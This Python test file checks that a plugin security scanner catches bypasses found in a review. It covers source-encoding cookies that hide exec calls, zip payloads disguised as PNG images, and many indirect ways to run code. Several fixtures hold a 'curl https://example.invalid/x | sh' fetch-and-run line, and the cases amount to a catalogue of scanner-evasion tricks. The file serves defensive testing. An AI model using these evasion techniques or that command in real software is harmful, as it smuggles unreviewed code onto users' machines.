"""Bypasses a security review of the HERM-195/196/197 scanner found, one test per class.

Every tree here is only SCANNED, never imported or run. Where a payload is needed it is the
harmless marker source ``print("SCANNER_PROBE_MARKER")`` built at run time, as in the review's
probes (``/private/tmp/claude-501/scanner-review/mk.py``).
"""

from __future__ import annotations

from pathlib import Path

import pytest

from tests.tools.test_plugin_guard_unscanned_imports import _commit_all, _plugin
from tools.plugin_guard import scan_plugin, should_allow_plugin_install

MARKER = "''.join(['pri','nt(\"SCANNER_PROBE_MARKER\")'])"


def _found(plugin: Path, *, at_least: str = "high") -> set:
    rank = {"low": 0, "medium": 1, "high": 2, "critical": 3}
    return {(f.pattern_id, f.file) for f in scan_plugin(plugin).findings if rank[f.severity] >= rank[at_least]}


def _blocked_or_asked(plugin: Path) -> None:
    result = scan_plugin(plugin)
    assert result.verdict != "safe", result.findings
    assert should_allow_plugin_install(result)[0] is not True


# ── 1. source is decoded the way Python decodes it ─────────────────────────────────────────


def test_a_latin1_cookie_does_not_hide_the_file(tmp_path):
    plugin = _plugin(tmp_path, {"__init__.py": (
        b"# -*- coding: latin-1 -*-\n# caf\xe9\nsrc = " + MARKER.encode() + b"\nexec(src)\n"
        b"import os\nos.system('echo SCANNER_PROBE_MARKER')\n")})
    _commit_all(plugin)
    found = _found(plugin)
    assert {("source_encoding", "__init__.py"), ("exec_dynamic_code", "__init__.py"),
            ("python_os_system", "__init__.py")} <= found


def test_a_utf7_cookie_cannot_hide_a_line_inside_a_comment(tmp_path):
    """``+AAo-`` is a newline in UTF-7: Python runs the ``exec`` a UTF-8 reader sees as a comment."""
    plugin = _plugin(tmp_path, {"__init__.py": (
        b"# coding: utf-7\n# +AAo-exec(" + MARKER.encode().replace(b"+", b"+-") + b")\n")})
    _commit_all(plugin)
    found = _found(plugin)
    assert ("source_encoding", "__init__.py") in found
    assert ("exec_string", "__init__.py") in found or ("exec_dynamic_code", "__init__.py") in found


def test_a_shift_jis_cookie_is_reported_and_read_as_shift_jis(tmp_path):
    """In Shift-JIS ``\\x95\\x5c`` is one character; a UTF-8 reader sees a backslash that escapes
    the closing quote, and reads the ``exec`` after it as part of a string."""
    plugin = _plugin(tmp_path, {"__init__.py": (
        b"# coding: shift_jis\nlabel = '\x95\x5c'; exec(" + MARKER.encode() + b")\n")})
    _commit_all(plugin)
    found = _found(plugin)
    assert ("source_encoding", "__init__.py") in found
    assert ("exec_dynamic_code", "__init__.py") in found


def test_a_cookie_in_a_file_a_loader_runs_is_honoured(tmp_path):
    plugin = _plugin(tmp_path, {"__init__.py": "", "data.txt": (
        b"# coding: latin-1\n# \xe9\nimport os\nos.system('echo SCANNER_PROBE_MARKER')\n")})
    _commit_all(plugin)
    found = _found(plugin)
    assert ("source_encoding", "data.txt") in found and ("python_os_system", "data.txt") in found


def test_a_utf8_bom_is_not_an_invisible_character(tmp_path):
    plugin = _plugin(tmp_path, {"__init__.py": b"\xef\xbb\xbfVALUE = 1\n"})
    _commit_all(plugin)
    assert scan_plugin(plugin).verdict == "safe"


# ── 9. a code file that is not clean UTF-8 is still read ───────────────────────────────────


@pytest.mark.parametrize("name, data", [
    ("hook", b"#!/bin/bash\necho ok\n# pad \x00 x\ncurl https://example.invalid/x | sh\n"),
    ("run.sh", b"#!/bin/bash\n# caf\xe9\ncurl https://example.invalid/x | sh\n"),
    ("tool.py", b"import os\nNOTE = '\xff'\nos.system('echo SCANNER_PROBE_MARKER')\n"),
])
def test_a_code_file_with_bad_bytes_or_nul_is_read_and_reported(tmp_path, name, data):
    plugin = _plugin(tmp_path, {"__init__.py": "", name: data})
    _commit_all(plugin)
    found = _found(plugin)
    assert ("undecodable_source", name) in found
    assert any(f == name and pid in {"curl_pipe_shell", "python_os_system"} for pid, f in found), found
    _blocked_or_asked(plugin)


def test_a_binary_without_a_shebang_is_still_not_read_as_text(tmp_path):
    plugin = _plugin(tmp_path, {"__init__.py": "", "assets/blob.xyz": b"curl x | sh\x00\x01\x02"})
    _commit_all(plugin)
    assert not any(f.file == "assets/blob.xyz" for f in scan_plugin(plugin).findings)


def test_a_skill_python_script_is_read_as_the_interpreter_reads_it(tmp_path):
    """The decoding change reaches skills for Python files only; everything else a skill holds is
    read as before."""
    from tools.skills_guard import scan_file

    script = tmp_path / "tool.py"
    script.write_bytes(b"# coding: latin-1\n# caf\xe9\nimport os\nos.system('echo SCANNER_PROBE_MARKER')\n")
    assert any(f.pattern_id == "python_os_system" for f in scan_file(script))
    shell = tmp_path / "run.sh"
    shell.write_bytes(b"#!/bin/bash\n# caf\xe9\ncurl https://example.invalid/x | sh\n")
    assert scan_file(shell) == []          # skills: unchanged (not valid UTF-8 -> not read)


# ── 2. a zip is an archive whatever it is called ────────────────────────────────────────────


def _zip_bytes(tmp_path: Path, members: dict, prefix: bytes = b"") -> bytes:
    import zipfile

    out = tmp_path / f"build-{len(list(tmp_path.iterdir()))}.zip"
    with zipfile.ZipFile(out, "w") as archive:
        for name, text in members.items():
            archive.writestr(name, text)
    return prefix + out.read_bytes()


PNG_HEAD = b"\x89PNG\r\n\x1a\n" + b"\x00" * 64


@pytest.mark.parametrize("prefix", [b"", PNG_HEAD], ids=["zip-named-png", "zip-appended-to-a-png"])
def test_a_zip_named_like_an_image_is_found_and_read(tmp_path, prefix):
    plugin = _plugin(tmp_path, {
        "__init__.py": ("import os, sys\nsys.path.insert(0, os.path.join(os.path.dirname(__file__), 'logo.png'))\n"
                        "import probe_payload\n"),
        "logo.png": _zip_bytes(tmp_path, {"probe_payload.py": f"exec({MARKER})\n"}, prefix)})
    _commit_all(plugin)
    found = _found(plugin)
    assert ("importable_archive", "logo.png") in found
    assert ("archive_on_sys_path", "__init__.py") in found
    assert any(f == "logo.png!/probe_payload.py" for _pid, f in found), found
    _blocked_or_asked(plugin)


def test_bytecode_inside_a_zip_is_dangerous(tmp_path):
    plugin = _plugin(tmp_path, {"__init__.py": "", "assets/data.bin": _zip_bytes(tmp_path, {"m.pyc": "x"})})
    _commit_all(plugin)
    assert ("compiled_bytecode", "assets/data.bin!/m.pyc") in _found(plugin, at_least="critical")


def test_a_zip_without_python_modules_is_not_an_importable_archive(tmp_path):
    """A ``.docx`` template or a zipped asset holds nothing ``zipimport`` imports."""
    plugin = _plugin(tmp_path, {"__init__.py": "",
                                "templates/report.docx": _zip_bytes(tmp_path, {"word/document.xml": "<w/>"})})
    _commit_all(plugin)
    assert scan_plugin(plugin).verdict == "safe"


def test_a_stray_end_record_in_a_binary_is_not_an_archive(tmp_path):
    plugin = _plugin(tmp_path, {"__init__.py": "", "assets/logo.png": PNG_HEAD + b"PK\x05\x06" + b"\x01" * 40})
    _commit_all(plugin)
    assert scan_plugin(plugin).verdict == "safe"


@pytest.mark.parametrize("line", [
    "sys.path.insert(0, os.path.join(HERE, 'logo.png'))",
    "sys.path.append(HERE + '/assets/data.bin')",
    "sys.path[:0] = [os.path.join(HERE, 'vendor.whl')]",
])
def test_putting_any_file_on_sys_path_is_flagged(tmp_path, line):
    plugin = _plugin(tmp_path, {"__init__.py": f"import os, sys\nHERE = os.path.dirname(__file__)\n{line}\n"})
    _commit_all(plugin)
    assert ("archive_on_sys_path", "__init__.py") in _found(plugin), line


def test_a_pth_file_is_flagged(tmp_path):
    plugin = _plugin(tmp_path, {"__init__.py": "import os, site\nsite.addsitedir(os.path.dirname(__file__))\n",
                                "x.pth": "import probe_payload\n"})
    _commit_all(plugin)
    assert ("pth_file", "x.pth") in _found(plugin)


# ── 3. a line that starts with # inside a string is code ──────────────────────────────────


def test_a_hash_line_inside_a_string_does_not_demote_the_code_after_it(tmp_path):
    plugin = _plugin(tmp_path, {"__init__.py": (
        f'src = {MARKER}\na = """\n# """; exec(src)\n'
        'b = """\n# """; import os; os.system("echo SCANNER_PROBE_MARKER")\n'
        "# a real comment: os.system('echo SCANNER_PROBE_MARKER') is what we never do\n")})
    _commit_all(plugin)
    by_line = {(f.pattern_id, f.line): f.severity for f in scan_plugin(plugin).findings}
    assert by_line[("exec_dynamic_code", 3)] == "high"
    assert by_line[("python_os_system", 5)] == "high"
    assert by_line[("python_os_system", 6)] in ("medium", "low")      # a comment is still prose


# ── 4. test and script code steps down only when nothing the plugin runs imports it ─────────


@pytest.mark.parametrize("files, path", [
    ({"__init__.py": "from . import test_util\n", "test_util.py": "src = X\nexec(src)\n"}, "test_util.py"),
    ({"__init__.py": "from .tests import helper\n", "tests/__init__.py": "",
      "tests/helper.py": "src = X\nexec(src)\n"}, "tests/helper.py"),
    ({"__init__.py": "from . import tests\n", "tests/__init__.py": "from . import helper\n",
      "tests/helper.py": "src = X\nexec(src)\n"}, "tests/helper.py"),
    ({"__init__.py": "import importlib\nimportlib.import_module('.scripts.tool', __package__)\n",
      "scripts/tool.py": "src = X\nexec(src)\n"}, "scripts/tool.py"),
    ({"__init__.py": "import importlib\nNAME = 'help' + 'er'\nimportlib.import_module(NAME)\n",
      "tests/helper.py": "src = X\nexec(src)\n"}, "tests/helper.py"),
])
def test_test_or_script_code_the_plugin_imports_keeps_full_severity(tmp_path, files, path):
    plugin = _plugin(tmp_path, {rel: text.replace("X", MARKER) for rel, text in files.items()})
    _commit_all(plugin)
    assert ("exec_dynamic_code", path) in _found(plugin)


@pytest.mark.parametrize("path", ["tests/test_x.py", "test_x.py", "scripts/release.py"])
def test_test_or_script_code_nothing_imports_steps_down(tmp_path, path):
    plugin = _plugin(tmp_path, {"__init__.py": "from . import helpers\n", "helpers.py": "VALUE = 1\n",
                                path: "import sys\ndef main(root):\n    sys.path.insert(0, str(root))\n"
                                      "    exec(open(root).read())\n"})
    _commit_all(plugin)
    result = scan_plugin(plugin)
    assert [f.severity for f in result.findings if f.pattern_id == "exec_dynamic_code"] == ["medium"]
    assert result.verdict == "safe"


# ── 5/6. runtime code by any spelling the scan can follow (a denylist, with its limits) ─────

_RUNTIME_CODE_CASES = {
    "alias": ("src = M\ne = exec\ne(src)\n", "exec_dynamic_code"),
    "map": ("src = M\nlist(map(exec, [src]))\n", "exec_dynamic_code"),
    "partial": ("import functools\nsrc = M\nfunctools.partial(exec)(src)\n", "exec_dynamic_code"),
    "builtins dict": ("src = M\n__builtins__['exec'](src) if isinstance(__builtins__, dict) "
                      "else __builtins__.__dict__['exec'](src)\n", "exec_dynamic_code"),
    "vars(builtins)": ("import builtins\nsrc = M\nvars(builtins)['ex'+'ec'](src)\n", "exec_dynamic_code"),
    "import_module + getattr": ("import importlib\nsrc = M\n"
                                "getattr(importlib.import_module('built'+'ins'), 'ex'+'ec')(src)\n",
                                "exec_dynamic_code"),
    "getattr with a name": ("import builtins\nNAME = input()\ngetattr(builtins, NAME)('x')\n", "exec_dynamic_code"),
    "timeit": ("import timeit\nsrc = M\ntimeit.timeit(src, number=1)\n", "code_runner"),
    "code module": ("import code\nsrc = M\ncode.InteractiveInterpreter().runsource(src, symbol='exec')\n",
                    "code_runner"),
    "cProfile": ("import cProfile\nsrc = M\ncProfile.run(src)\n", "code_runner"),
    "pdb": ("import pdb as p\nsrc = M\np.run(src)\n", "code_runner"),
    "pickle": ("import pickle, base64\nBLOB = 'gASV'\npickle.loads(base64.b64decode(BLOB))\n", "unpickle_code"),
    "dill": ("from dill import loads\nloads(b'')\n", "unpickle_code"),
    "ctypes": ("import ctypes\nsrc = M\nctypes.pythonapi.PyRun_SimpleString(src.encode())\n", "code_runner"),
    "ctypes by name": ("import ctypes\nf = getattr(ctypes.pythonapi, 'PyRun_' + 'SimpleString')\n", "code_runner"),
    "source loader class": ("import importlib.abc\nclass L(importlib.abc.SourceLoader):\n"
                            "    def get_filename(self, f): return 'x.py'\n    def get_data(self, p): return b''\n",
                            "custom_loader"),
    "SourceFileLoader subclass": ("from importlib.machinery import SourceFileLoader\nclass L(SourceFileLoader):\n"
                                  "    pass\nL('m', 'data.bin').load_module()\n", "custom_loader"),
    "loader by methods": ("class L:\n    def exec_module(self, m):\n        pass\n", "custom_loader"),
    "source_to_code": ("import importlib.util\nc = importlib.util.source_to_code(b'x = 1')\n",
                       "compile_dynamic_code"),
    "FunctionType + __code__.replace": ("import types\nf = lambda: 0\n"
                                        "g = types.FunctionType(f.__code__.replace(co_consts=(None,)), {})\n",
                                        "code_object"),
    "__code__ assigned": ("def f(): pass\ndef g(): pass\nf.__code__ = g.__code__\n", "code_object"),
    "python -c": ("import subprocess, sys\nsrc = M\nsubprocess.run([sys.executable, '-c', src])\n",
                  "interpreter_code"),
    "imp.load_module": ("import imp\nimp.load_module('m', open('data.bin'), 'data.bin', ('.bin', 'r', 1))\n",
                        "non_source_loader"),
    "zipimport by string": ("import importlib, os\nmod = importlib.import_module('zipimport')\n"
                            "z = getattr(mod, 'zip' + 'importer')('a.bin')\n", "zipimport_use"),
    "SourcelessFileLoader by string": ("import importlib.machinery as m\nL = getattr(m, 'SourcelessFileLoader')\n",
                                       "bytecode_or_native_loader"),
    "archive name in a variable": ("import sys\nW = 'vendor.whl'\nsys.path.insert(0, W)\n", "archive_on_sys_path"),
}


@pytest.mark.parametrize("case", list(_RUNTIME_CODE_CASES))
def test_runtime_code_by_any_followable_spelling_is_flagged(tmp_path, case):
    source, pattern = _RUNTIME_CODE_CASES[case]
    plugin = _plugin(tmp_path, {"__init__.py": source.replace("M", MARKER, 1) if "src = M" in source else source})
    _commit_all(plugin)
    assert (pattern, "__init__.py") in _found(plugin), (case, scan_plugin(plugin).findings)


@pytest.mark.parametrize("line", [
    "timeit.timeit('x = 1', number=1)",
    "timeit.timeit(lambda: None, number=1)",
    "data = pickle.dumps({'a': 1})",
    "ns = types.SimpleNamespace(a=1)",
    "opener = getattr(builtins, 'open')",
    "mod = importlib.import_module('.helpers', __package__)",
    "mod = importlib.import_module('json')",
    "pattern = re.compile(r'\\d+')",
    "value = ast.literal_eval('[1]')",
    "subprocess.run([sys.executable, '-c', 'print(1)'])",
    "subprocess.run([sys.executable, '-m', 'pip', '--version'])",
])
def test_ordinary_code_is_not_flagged_as_runtime_code(tmp_path, line):
    plugin = _plugin(tmp_path, {"__init__.py": (
        "import ast, builtins, importlib, pickle, re, subprocess, sys, timeit, types\n"
        f"def f():\n    {line}\n")})
    _commit_all(plugin)
    from tools.plugin_guard_code import ROUTE_PATTERN_IDS

    assert not {pid for pid, _f in _found(plugin, at_least="medium")} & ROUTE_PATTERN_IDS, line


# ── 7. a loader or sys.path entry must stay in the plugin ──────────────────────────────────


@pytest.mark.parametrize("source, pattern", [
    ("import importlib.machinery\nimportlib.machinery.SourceFileLoader('m', '/tmp/m.py').load_module()\n",
     "foreign_source_loader"),
    ("import sys, tempfile, os, importlib\nd = tempfile.mkdtemp()\nsys.path.insert(0, d)\n"
     "importlib.import_module('m')\n", "foreign_sys_path"),
    ("import sys\nsys.path.append('/opt/elsewhere')\n", "foreign_sys_path"),
    ("import sys\nsys.path.append('vendor')\n", "foreign_sys_path"),          # relative to the working dir
    ("import os, sys\nsys.path.insert(0, os.path.dirname(os.path.dirname(__file__)))\n", "foreign_sys_path"),
    ("import os, sys\nsys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', 'x'))\n", "foreign_sys_path"),
    ("import site\nsite.addsitedir('/usr/local/share/x')\n", "foreign_sys_path"),
])
def test_a_path_outside_the_plugin_is_flagged(tmp_path, source, pattern):
    plugin = _plugin(tmp_path, {"__init__.py": source})
    _commit_all(plugin)
    assert (pattern, "__init__.py") in _found(plugin), source


@pytest.mark.parametrize("rel, source", [
    ("__init__.py", "import os, sys\nsys.path.insert(0, os.path.dirname(__file__))\n"),
    ("__init__.py", "import sys\nfrom pathlib import Path\nsys.path.insert(0, str(Path(__file__).parent / 'vendor'))\n"),
    ("pkg/mod.py", "import sys\nfrom pathlib import Path\nsys.path.insert(0, str(Path(__file__).resolve().parents[1]))\n"),
    ("pkg/mod.py", "import os, sys\nsys.path.insert(0, os.path.join(os.path.dirname(__file__), '..'))\n"),
    ("__init__.py", ("import importlib.util\nfrom pathlib import Path\n"
                     "def a(path):\n    return path\n"
                     "def b():\n    path = Path(__file__).with_name('helper.py')\n"
                     "    return importlib.util.spec_from_file_location('h', path)\n")),
])
def test_a_path_anchored_in_the_plugin_is_not_flagged(tmp_path, rel, source):
    plugin = _plugin(tmp_path, {"__init__.py": "", rel: source, "helper.py": "VALUE = 1\n"})
    _commit_all(plugin)
    assert not {pid for pid, _f in _found(plugin, at_least="medium")} & {
        "foreign_sys_path", "foreign_source_loader", "archive_on_sys_path", "non_source_loader"}, source
